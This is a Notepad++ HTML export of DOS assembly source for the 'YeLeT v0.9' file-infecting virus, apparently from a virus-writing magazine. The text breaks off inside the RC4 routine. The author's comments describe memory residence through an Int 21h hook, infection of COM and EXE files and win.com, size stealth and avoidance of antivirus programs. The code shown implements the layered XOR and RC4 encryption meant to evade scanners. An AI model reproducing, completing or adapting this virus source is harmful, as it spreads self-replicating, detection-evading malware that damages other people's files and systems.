<!DOCTYPE html PUBLIC "-//W3C//DTD HTML 4.01//EN" "http://www.w3.org/TR/1999/REC-html401-19991224/strict.dtd">
<html>
<head>
<META http-equiv=Content-Type content="text/html; charset=windows-1252">
<title>Exported from Notepad++</title>
<style type="text/css">
span {
	font-family: 'Courier New';
	font-size: 10pt;
	color: #000000;
}
.sc0 {
}
.sc1 {
	color: #008000;
}
.sc2 {
	color: #FF8000;
}
.sc4 {
	font-weight: bold;
	color: #000080;
}
.sc5 {
}
.sc6 {
	font-weight: bold;
	color: #0000FF;
}
.sc8 {
	font-weight: bold;
	color: #8080FF;
}
.sc9 {
	color: #0080FF;
}
.sc10 {
	font-weight: bold;
	color: #000080;
}
.sc12 {
	color: #808000;
}
.sc13 {
	color: #808080;
}
</style>
</head>
<body>
<div style="float: left; white-space: pre; line-height: 1; background: #FFFFFF; "><span class="sc1">; comment $</span><span class="sc0">
</span><span class="sc1">; </span><span class="sc0">
</span><span class="sc1">;  ++++++++++++++++++++++++++++++ YeLeT v0.9 ++++++++++++++++++++++++++++++++++</span><span class="sc0">
</span><span class="sc1">; </span><span class="sc0">
</span><span class="sc1">;      This is YeLeT version 0.9, it is not the final version, i wanted to</span><span class="sc0">
</span><span class="sc1">;    add some more stuff but didn't get it done until we released CB #4.</span><span class="sc0">
</span><span class="sc1">;    Also this is NOT for educational purposes :) because its HIGHLY</span><span class="sc0">
</span><span class="sc1">;    unoptimized (... well, but it werx!)</span><span class="sc0">
</span><span class="sc1">;    I know that this virus is getting detected by AVP as 'Suspicion</span><span class="sc0">
</span><span class="sc1">;    Type_ComExeTsr' (don't know about other scanners) but i don't care about</span><span class="sc0">
</span><span class="sc1">;    that yet as its just a beta version, a final version (with many</span><span class="sc0">
</span><span class="sc1">;    improvments) will sometimes be available from the CB webpage.</span><span class="sc0">
</span><span class="sc1">; </span><span class="sc0">
</span><span class="sc1">;      Anyway, YeLeT stays resident and hooks Int 21h (func: 4Bh) and infects</span><span class="sc0">
</span><span class="sc1">;    MZ/ZM EXE and COM files both in plain DOS and after loading Winblows.</span><span class="sc0">
</span><span class="sc1">;    It uses 2 encryption layers, the second one uses just simple XOR (with</span><span class="sc0">
</span><span class="sc1">;    some bruteforce cracking so the key doesn't have to be stored in the</span><span class="sc0">
</span><span class="sc1">;    code) and the first layer uses my own Unoptimized-Viral-RC4 routine</span><span class="sc0">
</span><span class="sc1">;    (this routine doesn't use any bruteforce cracking routines as it would</span><span class="sc0">
</span><span class="sc1">;    make the user a bit suspicious if files would take billions of years to</span><span class="sc0">
</span><span class="sc1">;    load ;-)). Also it uses simple DTA-size stealth, direct infection of</span><span class="sc0">
</span><span class="sc1">;    win.com, and it avoids infection of some AV programs and archivers.</span><span class="sc0">
</span><span class="sc1">; </span><span class="sc0">
</span><span class="sc1">;      Credits &amp; Greets go to:</span><span class="sc0">
</span><span class="sc1">; </span><span class="sc0">
</span><span class="sc1">;     Spanska          - for some useful IDEAs!! :-)</span><span class="sc0">
</span><span class="sc1">;     Bruce Schneier   - for the book Applied Cryptography (i used the RC4</span><span class="sc0">
</span><span class="sc1">;                        algorithm described in his book).</span><span class="sc0">
</span><span class="sc1">;                        ISBN - 0-471-11709-9 -</span><span class="sc0">
</span><span class="sc1">;     AVP              - their support sucks, they always just tell you to</span><span class="sc0">
</span><span class="sc1">;                        wait for the next update, but their scanner is the</span><span class="sc0">
</span><span class="sc1">;                        best! :-)</span><span class="sc0">
</span><span class="sc1">;     Horny Toad       - thanks for sticking together our magazines all the</span><span class="sc0">
</span><span class="sc1">;                        time!</span><span class="sc0">
</span><span class="sc1">;     Opic             - thanks for helping him ^^^ out with the mag this</span><span class="sc0">
</span><span class="sc1">;                        time. ;-)</span><span class="sc0">
</span><span class="sc1">; </span><span class="sc0">
</span><span class="sc1">;      ... and before the interesting stuff beginns, here is a description of</span><span class="sc0">
</span><span class="sc1">;    RC4 (from 'Applied Cryptography'):</span><span class="sc0">
</span><span class="sc1">; </span><span class="sc0">
</span><span class="sc1">;   - The algorithm works in OFB: The keystream is independent of the</span><span class="sc0">
</span><span class="sc1">;     plaintext. It has a 8 * 8 S-box: S[0], S[1], ... S[255]. The entries</span><span class="sc0">
</span><span class="sc1">;     are a permutation of the numbers 0 through 255, and the permutation is</span><span class="sc0">
</span><span class="sc1">;     a function of the variable-length key. It has two counters, i and j,</span><span class="sc0">
</span><span class="sc1">;     initialized at zero.</span><span class="sc0">
</span><span class="sc1">; </span><span class="sc0">
</span><span class="sc1">;       i = (i + 1) mod 256</span><span class="sc0">
</span><span class="sc1">;       j = (j + S[i]) mod 256</span><span class="sc0">
</span><span class="sc1">;       swap S[i] and S[j]</span><span class="sc0">
</span><span class="sc1">;       t = (S[i] + S[j]) mod 256</span><span class="sc0">
</span><span class="sc1">;       K = S[t]</span><span class="sc0">
</span><span class="sc1">; </span><span class="sc0">
</span><span class="sc1">;     The byte K is XORed with the plaintext to produce ciphertext or XORed</span><span class="sc0">
</span><span class="sc1">;     with the ciphertext to produce plaintext.</span><span class="sc0">
</span><span class="sc1">; </span><span class="sc0">
</span><span class="sc1">;   - Initializing the S-box is also easy. First fill it linearly:</span><span class="sc0">
</span><span class="sc1">;     S[0] = 0, S[1] = 1,... , S[255] = 255</span><span class="sc0">
</span><span class="sc1">;     Then fill another 256-byte array with the key, repeating the key as</span><span class="sc0">
</span><span class="sc1">;     often as necessary to fill the entire array: K[0], K[1],... K[255]. Set</span><span class="sc0">
</span><span class="sc1">;     the index j to zero, then:</span><span class="sc0">
</span><span class="sc1">; </span><span class="sc0">
</span><span class="sc1">;       for i = 0 to 255:</span><span class="sc0">
</span><span class="sc1">;         j = (j + S[i] + K[i]) mod 256</span><span class="sc0">
</span><span class="sc1">;         swap S[i] and S[j]</span><span class="sc0">
</span><span class="sc1">; </span><span class="sc0">
</span><span class="sc1">;    Thats it, please send bug reports to spooky@nym.alias.net :-)</span><span class="sc0">
</span><span class="sc1">; </span><span class="sc0">
</span><span class="sc1">;  ++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++</span><span class="sc0">
</span><span class="sc1">; </span><span class="sc0">
</span><span class="sc1">;         $</span><span class="sc0">

</span><span class="sc9">.model</span><span class="sc0"> </span><span class="sc10">tiny</span><span class="sc0">                 </span><span class="sc1">; .model virus</span><span class="sc0">
</span><span class="sc2">.286</span><span class="sc0">                        </span><span class="sc1">; allow 286 instructions (286's are needed for</span><span class="sc0">
                            </span><span class="sc1">; pusha/popa)</span><span class="sc0">
</span><span class="sc9">.code</span><span class="sc0">                       </span><span class="sc1">; code begins here</span><span class="sc0">
 </span><span class="sc9">ORG</span><span class="sc0"> </span><span class="sc2">0CBh</span><span class="sc0">                   </span><span class="sc1">; Brought to you by CB ;-)</span><span class="sc0">
 </span><span class="sc5">jumps</span><span class="sc0">                      </span><span class="sc1">; automatically change conditional jumps which are</span><span class="sc0">
                            </span><span class="sc1">; bigger then -128/+127 bytes.</span><span class="sc0">
                            </span><span class="sc1">; some constants</span><span class="sc0">
 </span><span class="sc5">com</span><span class="sc0"> </span><span class="sc9">equ</span><span class="sc0"> </span><span class="sc2">0</span><span class="sc0">                  </span><span class="sc1">; used to detect which 'restore routine' to run</span><span class="sc0">
 </span><span class="sc5">exe</span><span class="sc0"> </span><span class="sc9">equ</span><span class="sc0"> </span><span class="sc2">1</span><span class="sc0">
 </span><span class="sc5">off</span><span class="sc0"> </span><span class="sc9">equ</span><span class="sc0"> </span><span class="sc2">0</span><span class="sc0">                  </span><span class="sc1">; archiver executed? (used in the stealth routine)</span><span class="sc0">
 </span><span class="sc5">on</span><span class="sc0">  </span><span class="sc9">equ</span><span class="sc0"> </span><span class="sc2">1</span><span class="sc0">                  </span><span class="sc1">; </span><span class="sc0">

 </span><span class="sc5">exit_exe</span><span class="sc4">:</span><span class="sc0">                          </span><span class="sc1">; only used at the first execution</span><span class="sc0">
  </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc2">4c00h</span><span class="sc0">
  </span><span class="sc6">int</span><span class="sc0"> </span><span class="sc2">21h</span><span class="sc0">

 </span><span class="sc5">start</span><span class="sc4">:</span><span class="sc0">                     </span><span class="sc1">; entry point</span><span class="sc0">


  </span><span class="sc6">call</span><span class="sc0"> </span><span class="sc5">delta</span><span class="sc0">                </span><span class="sc1">; get a delta offset</span><span class="sc0">
 </span><span class="sc5">delta</span><span class="sc4">:</span><span class="sc0">
  </span><span class="sc6">pop</span><span class="sc0"> </span><span class="sc8">bp</span><span class="sc0">
  </span><span class="sc6">sub</span><span class="sc0"> </span><span class="sc8">bp</span><span class="sc4">,</span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">delta</span><span class="sc0">

  </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc8">ds</span><span class="sc0">                   </span><span class="sc1">; save DS and ES (point to the PSP) for later use</span><span class="sc0">
  </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc8">es</span><span class="sc0">                   </span><span class="sc1">; when returning control to an exe file</span><span class="sc0">

  </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc8">cs</span><span class="sc0">                   </span><span class="sc1">; DS = ES = CS</span><span class="sc0">
  </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc8">cs</span><span class="sc0">
  </span><span class="sc6">pop</span><span class="sc0"> </span><span class="sc8">ds</span><span class="sc0">
  </span><span class="sc6">pop</span><span class="sc0"> </span><span class="sc8">es</span><span class="sc0">

  </span><span class="sc6">lea</span><span class="sc0"> </span><span class="sc8">si</span><span class="sc4">,[</span><span class="sc8">bp</span><span class="sc4">+</span><span class="sc5">xor_crypt_start</span><span class="sc4">]</span><span class="sc0">           </span><span class="sc1">; simple bruteforce attack to find the</span><span class="sc0">
 </span><span class="sc5">bruteforce_loopy</span><span class="sc4">:</span><span class="sc0">                  </span><span class="sc1">; decryption key (like Spanskas IDEA</span><span class="sc0">
  </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc10">byte</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc8">cs</span><span class="sc4">:[</span><span class="sc8">si</span><span class="sc4">]</span><span class="sc0">           </span><span class="sc1">; virus). it fools any scanner which</span><span class="sc0">
  </span><span class="sc6">xor</span><span class="sc0"> </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc10">byte</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc8">cs</span><span class="sc4">:[</span><span class="sc8">bp</span><span class="sc4">+</span><span class="sc5">xor_value</span><span class="sc4">]</span><span class="sc0"> </span><span class="sc1">; doesn't have something like AVP's 'code-</span><span class="sc0">
  </span><span class="sc6">cmp</span><span class="sc0"> </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc2">90h</span><span class="sc0">                        </span><span class="sc1">; analyzer' function.</span><span class="sc0">
  </span><span class="sc6">je</span><span class="sc0"> </span><span class="sc5">found_it</span><span class="sc0">
  </span><span class="sc6">inc</span><span class="sc0"> </span><span class="sc10">byte</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc8">cs</span><span class="sc4">:[</span><span class="sc8">bp</span><span class="sc4">+</span><span class="sc5">xor_value</span><span class="sc4">]</span><span class="sc0">
  </span><span class="sc6">jmp</span><span class="sc0"> </span><span class="sc5">bruteforce_loopy</span><span class="sc0">
  

 </span><span class="sc5">found_it</span><span class="sc4">:</span><span class="sc0">
                                </span><span class="sc1">; decrypt virus using a simple XOR algorithm</span><span class="sc0">
                                </span><span class="sc1">; from xor_crypt_start</span><span class="sc0">
  </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">di</span><span class="sc4">,</span><span class="sc8">si</span><span class="sc0">                     </span><span class="sc1">; to xor_crypt_start</span><span class="sc0">
  </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">cx</span><span class="sc4">,</span><span class="sc5">the_end</span><span class="sc0"> </span><span class="sc4">-</span><span class="sc0"> </span><span class="sc5">xor_crypt_start</span><span class="sc0">  </span><span class="sc1">; the_end - xor_crypt_start byte's</span><span class="sc0">
  </span><span class="sc6">call</span><span class="sc0"> </span><span class="sc5">crypt</span><span class="sc0">                    </span><span class="sc1">; decrypt it</span><span class="sc0">
  </span><span class="sc6">jmp</span><span class="sc0"> </span><span class="sc5">xor_crypt_start</span><span class="sc0">               </span><span class="sc1">; jump to the now decrypted part</span><span class="sc0">

 </span><span class="sc5">xor_value</span><span class="sc0"> </span><span class="sc9">db</span><span class="sc0"> </span><span class="sc2">0</span><span class="sc0">                 </span><span class="sc1">; en/decryption key used by the XOR encryption</span><span class="sc0">

                                
 </span><span class="sc5">crypt</span><span class="sc4">:</span><span class="sc0">                             </span><span class="sc1">; en/decryption routine</span><span class="sc0">
  </span><span class="sc6">lodsb</span><span class="sc0">                             </span><span class="sc1">; load one byte from DS:SI into AL</span><span class="sc0">
  </span><span class="sc6">xor</span><span class="sc0"> </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc10">byte</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc8">cs</span><span class="sc4">:[</span><span class="sc8">bp</span><span class="sc4">+</span><span class="sc5">xor_value</span><span class="sc4">]</span><span class="sc0"> </span><span class="sc1">; XOR it with xor_value</span><span class="sc0">
  </span><span class="sc6">stosb</span><span class="sc0">                             </span><span class="sc1">; store byte in AL at ES:DI</span><span class="sc0">
  </span><span class="sc6">loop</span><span class="sc0"> </span><span class="sc5">crypt</span><span class="sc0">                        </span><span class="sc1">; repeat until CX = 0</span><span class="sc0">
  </span><span class="sc6">ret</span><span class="sc0">                               </span><span class="sc1">; return</span><span class="sc0">

 </span><span class="sc5">xor_crypt_start</span><span class="sc4">:</span><span class="sc0">                   </span><span class="sc1">; - xor encrypted part begins here -</span><span class="sc0">

  </span><span class="sc6">nop</span><span class="sc0">                           </span><span class="sc1">; 'checksum' used by bruteforce decryption</span><span class="sc0">
                                </span><span class="sc1">; routine</span><span class="sc0">

  </span><span class="sc6">cmp</span><span class="sc0"> </span><span class="sc10">byte</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc8">cs</span><span class="sc4">:[</span><span class="sc8">bp</span><span class="sc4">+</span><span class="sc5">first</span><span class="sc4">],</span><span class="sc5">on</span><span class="sc0">
  </span><span class="sc6">je</span><span class="sc0"> </span><span class="sc5">rc4_crypt_start</span><span class="sc0">            </span><span class="sc1">; if its the first execution we do not decrypt</span><span class="sc0">
                                </span><span class="sc1">; the code using RC4, just jump over it</span><span class="sc0">

  </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">dx</span><span class="sc4">,</span><span class="sc2">42</span><span class="sc0">                     </span><span class="sc1">; expand the 42 byte key into a 256 byte</span><span class="sc0">
  </span><span class="sc6">call</span><span class="sc0"> </span><span class="sc5">rc4expandkey</span><span class="sc0">             </span><span class="sc1">; array</span><span class="sc0">

                                    </span><span class="sc1">; decrpyt code using RC4, </span><span class="sc0">
  </span><span class="sc6">lea</span><span class="sc0"> </span><span class="sc8">si</span><span class="sc4">,[</span><span class="sc8">bp</span><span class="sc4">+</span><span class="sc5">rc4_crypt_start</span><span class="sc4">]</span><span class="sc0">       </span><span class="sc1">; from rc4_crypt_start</span><span class="sc0">
  </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">di</span><span class="sc4">,</span><span class="sc8">si</span><span class="sc0">                         </span><span class="sc1">; to rc4_crypt_start</span><span class="sc0">
  </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">dx</span><span class="sc4">,</span><span class="sc5">the_end</span><span class="sc0"> </span><span class="sc4">-</span><span class="sc0"> </span><span class="sc5">rc4_crypt_start</span><span class="sc0">  </span><span class="sc1">; the_end - rc4_crypt_start bytes</span><span class="sc0">
  </span><span class="sc6">call</span><span class="sc0"> </span><span class="sc5">rc4crypt</span><span class="sc0">                     </span><span class="sc1">; decrypt it</span><span class="sc0">
  </span><span class="sc6">jmp</span><span class="sc0"> </span><span class="sc5">rc4_crypt_start</span><span class="sc0">               </span><span class="sc1">; jump over the en/decryption routines.</span><span class="sc0">


 </span><span class="sc5">rc4expandkey</span><span class="sc0"> </span><span class="sc9">proc</span><span class="sc0">
  </span><span class="sc6">pusha</span><span class="sc0">
  </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc10">byte</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">bp</span><span class="sc4">+</span><span class="sc5">key_ptr</span><span class="sc4">],</span><span class="sc2">0</span><span class="sc0">

  </span><span class="sc6">lea</span><span class="sc0"> </span><span class="sc8">di</span><span class="sc4">,[</span><span class="sc8">bp</span><span class="sc4">+</span><span class="sc5">rc4state</span><span class="sc4">]</span><span class="sc0">             </span><span class="sc1">; fill the rc4state array with 0 .. 255</span><span class="sc0">
  </span><span class="sc6">xor</span><span class="sc0"> </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc8">ax</span><span class="sc0">
 </span><span class="sc5">linear_loopy</span><span class="sc4">:</span><span class="sc0">
  </span><span class="sc6">stosb</span><span class="sc0">
  </span><span class="sc6">inc</span><span class="sc0"> </span><span class="sc8">al</span><span class="sc0">
  </span><span class="sc6">jnz</span><span class="sc0"> </span><span class="sc5">linear_loopy</span><span class="sc0">

  </span><span class="sc6">xor</span><span class="sc0"> </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc8">ax</span><span class="sc0">             </span><span class="sc1">; J = 0</span><span class="sc0">
  </span><span class="sc6">xor</span><span class="sc0"> </span><span class="sc8">bx</span><span class="sc4">,</span><span class="sc8">bx</span><span class="sc0">             </span><span class="sc1">; I = 0</span><span class="sc0">
 </span><span class="sc5">mutate_loopy</span><span class="sc4">:</span><span class="sc0">

  </span><span class="sc6">lea</span><span class="sc0"> </span><span class="sc8">si</span><span class="sc4">,[</span><span class="sc8">bp</span><span class="sc4">+</span><span class="sc5">rc4state</span><span class="sc4">]</span><span class="sc0"> 
  </span><span class="sc6">add</span><span class="sc0"> </span><span class="sc8">si</span><span class="sc4">,</span><span class="sc8">bx</span><span class="sc0">             
  </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">ch</span><span class="sc4">,</span><span class="sc8">cs</span><span class="sc4">:[</span><span class="sc8">si</span><span class="sc4">]</span><span class="sc0">        </span><span class="sc1">; CH = S[i]</span><span class="sc0">

  </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc8">bx</span><span class="sc0">
  </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">bl</span><span class="sc4">,[</span><span class="sc8">bp</span><span class="sc4">+</span><span class="sc5">key_ptr</span><span class="sc4">]</span><span class="sc0">

  </span><span class="sc6">lea</span><span class="sc0"> </span><span class="sc8">si</span><span class="sc4">,[</span><span class="sc8">bp</span><span class="sc4">+</span><span class="sc5">rc4key</span><span class="sc4">]</span><span class="sc0">    
  </span><span class="sc6">add</span><span class="sc0"> </span><span class="sc8">si</span><span class="sc4">,</span><span class="sc8">bx</span><span class="sc0">             
  </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">cl</span><span class="sc4">,</span><span class="sc8">cs</span><span class="sc4">:[</span><span class="sc8">si</span><span class="sc4">]</span><span class="sc0">        </span><span class="sc1">; CL = K[i]</span><span class="sc0">

  </span><span class="sc6">inc</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">bp</span><span class="sc4">+</span><span class="sc5">key_ptr</span><span class="sc4">]</span><span class="sc0">
  </span><span class="sc6">cmp</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">bp</span><span class="sc4">+</span><span class="sc5">key_ptr</span><span class="sc4">],</span><span class="sc8">dl</span><span class="sc0">   </span><span class="sc1">; dl = keylength ... reset key_ptr?</span><span class="sc0">
  </span><span class="sc6">jne</span><span class="sc0"> </span><span class="sc5">no_reset</span><span class="sc0">
  </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">bp</span><span class="sc4">+</span><span class="sc5">key_ptr</span><span class="sc4">],</span><span class="sc2">0</span><span class="sc0">
 </span><span class="sc5">no_reset</span><span class="sc4">:</span><span class="sc0">
  </span><span class="sc6">pop</span><span class="sc0"> </span><span class="sc8">bx</span><span class="sc0">

  </span><span class="sc6">add</span><span class="sc0"> </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc8">cl</span><span class="sc0">             </span><span class="sc1">; J = J + K[i]</span><span class="sc0">
  </span><span class="sc6">add</span><span class="sc0"> </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc8">ch</span><span class="sc0">             </span><span class="sc1">; J = J + S[i]</span><span class="sc0">
  </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">di</span><span class="sc4">,</span><span class="sc8">ax</span><span class="sc0">             </span><span class="sc1">; DI = J</span><span class="sc0">

                        </span><span class="sc1">; swap (S[i], S[j])</span><span class="sc0">
  </span><span class="sc6">lea</span><span class="sc0"> </span><span class="sc8">si</span><span class="sc4">,[</span><span class="sc8">bp</span><span class="sc4">+</span><span class="sc5">rc4state</span><span class="sc4">]</span><span class="sc0">
  </span><span class="sc6">add</span><span class="sc0"> </span><span class="sc8">si</span><span class="sc4">,</span><span class="sc8">bx</span><span class="sc0">
  </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc8">cs</span><span class="sc4">:[</span><span class="sc8">si</span><span class="sc4">]</span><span class="sc0">        </span><span class="sc1">; al = S[i]</span><span class="sc0">

  </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">bp</span><span class="sc4">+</span><span class="sc5">temp</span><span class="sc4">],</span><span class="sc8">al</span><span class="sc0">      </span><span class="sc1">; temp = S[i]</span><span class="sc0">

  </span><span class="sc6">lea</span><span class="sc0"> </span><span class="sc8">si</span><span class="sc4">,[</span><span class="sc8">bp</span><span class="sc4">+</span><span class="sc5">rc4state</span><span class="sc4">]</span><span class="sc0">
  </span><span class="sc6">add</span><span class="sc0"> </span><span class="sc8">si</span><span class="sc4">,</span><span class="sc8">di</span><span class="sc0">
  </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc8">cs</span><span class="sc4">:[</span><span class="sc8">si</span><span class="sc4">]</span><span class="sc0">        </span><span class="sc1">; al = S[j]</span><span class="sc0">

  </span><span class="sc6">lea</span><span class="sc0"> </span><span class="sc8">si</span><span class="sc4">,[</span><span class="sc8">bp</span><span class="sc4">+</span><span class="sc5">rc4state</span><span class="sc4">]</span><span class="sc0">
  </span><span class="sc6">add</span><span class="sc0"> </span><span class="sc8">si</span><span class="sc4">,</span><span class="sc8">bx</span><span class="sc0">
  </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">cs</span><span class="sc4">:[</span><span class="sc8">si</span><span class="sc4">],</span><span class="sc8">al</span><span class="sc0">        </span><span class="sc1">; S[i] = S[j]</span><span class="sc0">

  </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">al</span><span class="sc4">,[</span><span class="sc8">bp</span><span class="sc4">+</span><span class="sc5">temp</span><span class="sc4">]</span><span class="sc0">      </span><span class="sc1">; al = S[i]</span><span class="sc0">

  </span><span class="sc6">lea</span><span class="sc0"> </span><span class="sc8">si</span><span class="sc4">,[</span><span class="sc8">bp</span><span class="sc4">+</span><span class="sc5">rc4state</span><span class="sc4">]</span><span class="sc0">
  </span><span class="sc6">add</span><span class="sc0"> </span><span class="sc8">si</span><span class="sc4">,</span><span class="sc8">di</span><span class="sc0">
  </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">cs</span><span class="sc4">:[</span><span class="sc8">si</span><span class="sc4">],</span><span class="sc8">al</span><span class="sc0">        </span><span class="sc1">; S[j] = S[i]</span><span class="sc0">

  </span><span class="sc6">inc</span><span class="sc0"> </span><span class="sc8">bl</span><span class="sc0">                </span><span class="sc1">; I = I + 1</span><span class="sc0">
  </span><span class="sc6">jnz</span><span class="sc0"> </span><span class="sc5">mutate_loopy</span><span class="sc0">      </span><span class="sc1">; 256 loops done? yes - exit</span><span class="sc0">
  </span><span class="sc6">popa</span><span class="sc0">
  </span><span class="sc6">ret</span><span class="sc0">
 </span><span class="sc5">rc4expandkey</span><span class="sc0"> </span><span class="sc9">endp</span><span class="sc0">


 </span><span class="sc5">rc4crypt</span><span class="sc0"> </span><span class="sc9">proc</span><span class="sc0">
  </span><span class="sc6">pusha</span><span class="sc0">
  </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc10">word</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc8">cs</span><span class="sc4">:[</span><span class="sc8">bp</span><span class="sc4">+</span><span class="sc5">dest</span><span class="sc4">],</span><span class="sc8">di</span><span class="sc0">
  </span><span class="sc6">xor</span><span class="sc0"> </span><span class="sc8">bx</span><span class="sc4">,</span><span class="sc8">bx</span><span class="sc0">
  </span><span class="sc6">xor</span><span class="sc0"> </span><span class="sc8">di</span><span class="sc4">,</span><span class="sc8">di</span><span class="sc0">
  </span><span class="sc6">xor</span><span class="sc0"> </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc8">ax</span><span class="sc0">
  </span><span class="sc6">xor</span><span class="sc0"> </span><span class="sc8">cx</span><span class="sc4">,</span><span class="sc8">cx</span><span class="sc0">
 </span><span class="sc5">crypt_loopy</span><span class="sc4">:</span><span class="sc0">
  </span><span class="sc6">inc</span><span class="sc0"> </span><span class="sc8">bl</span><span class="sc0">                </span><span class="sc1">; I = I + 1</span><span class="sc0">

  </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">cx</span><span class="sc4">,</span><span class="sc8">di</span><span class="sc0">             </span><span class="sc1">; CX = DI = J</span><span class="sc0">
  </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc8">di</span><span class="sc0">
  </span><span class="sc6">lea</span><span class="sc0"> </span><span class="sc8">di</span><span class="sc4">,[</span><span class="sc8">bp</span><span class="sc4">+</span><span class="sc5">rc4state</span><span class="sc4">]</span><span class="sc0">
  </span><span class="sc6">add</span><span class="sc0"> </span><span class="sc8">di</span><span class="sc4">,</span><span class="sc8">bx</span><span class="sc0">
  </span><span class="sc6">add</span><span class="sc0"> </span><span class="sc8">cl</span><span class="sc4">,</span><span class="sc10">byte</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc8">cs</span><span class="sc4">:[</span><span class="sc8">di</span><span class="sc4">]</span><span class="sc0">
  </span><span class="sc6">pop</span><span class="sc0"> </span><span class="sc8">di</span><span class="sc0">
  </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">di</span><span class="sc4">,</span><span class="sc8">cx</span><span class="sc0">             </span><span class="sc1">; J = J + S[i]</span><span class="sc0">

  </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc8">di</span><span class="sc0">
  </span><span class="sc6">lea</span><span class="sc0"> </span><span class="sc8">di</span><span class="sc4">,[</span><span class="sc8">bp</span><span class="sc4">+</span><span class="sc5">rc4state</span><span class="sc4">]</span><span class="sc0">
  </span><span class="sc6">add</span><span class="sc0"> </span><span class="sc8">di</span><span class="sc4">,</span><span class="sc8">bx</span><span class="sc0">
  </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc10">byte</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc8">cs</span><span class="sc4">:[</span><span class="sc8">di</span><span class="sc4">]</span><span class="sc0">      </span><span class="sc1">; swap (S[i], S[j])</span><span class="sc0">
  </span><span class="sc6">pop</span><span class="sc0"> </span><span class="sc8">di</span><span class="sc0">
  </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc10">byte</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc8">cs</span><span class="sc4">:[</span><span class="sc8">bp</span><span class="sc4">+</span><span class="sc5">temp</span><span class="sc4">],</span><span class="sc8">al</span><span class="sc0">
  </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc8">si</span><span class="sc0">
  </span><span class="sc6">lea</span><span class="sc0"> </span><span class="sc8">si</span><span class="sc4">,[</span><span class="sc8">bp</span><span class="sc4">+</span><span class="sc5">rc4state</span><span class="sc4">]</span><span class="sc0">
  </span><span class="sc6">add</span><span class="sc0"> </span><span class="sc8">si</span><span class="sc4">,</span><span class="sc8">di</span><span class="sc0">
  </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc10">byte</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc8">cs</span><span class="sc4">:[</span><span class="sc8">si</span><span class="sc4">]</span><span class="sc0">
  </span><span class="sc6">lea</span><span class="sc0"> </span><span class="sc8">si</span><span class="sc4">,[</span><span class="sc8">bp</span><span class="sc4">+</span><span class="sc5">rc4state</span><span class="sc4">]</span><span class="sc0">
  </span><span class="sc6">add</span><span class="sc0"> </span><span class="sc8">si</span><span class="sc4">,</span><span class="sc8">bx</span><span class="sc0">
  </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc10">byte</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc8">cs</span><span class="sc4">:[</span><span class="sc8">si</span><span class="sc4">],</span><span class="sc8">al</span><span class="sc0">
  </span><span class="sc6">pop</span><span class="sc0"> </span><span class="sc8">si</span><span class="sc0">
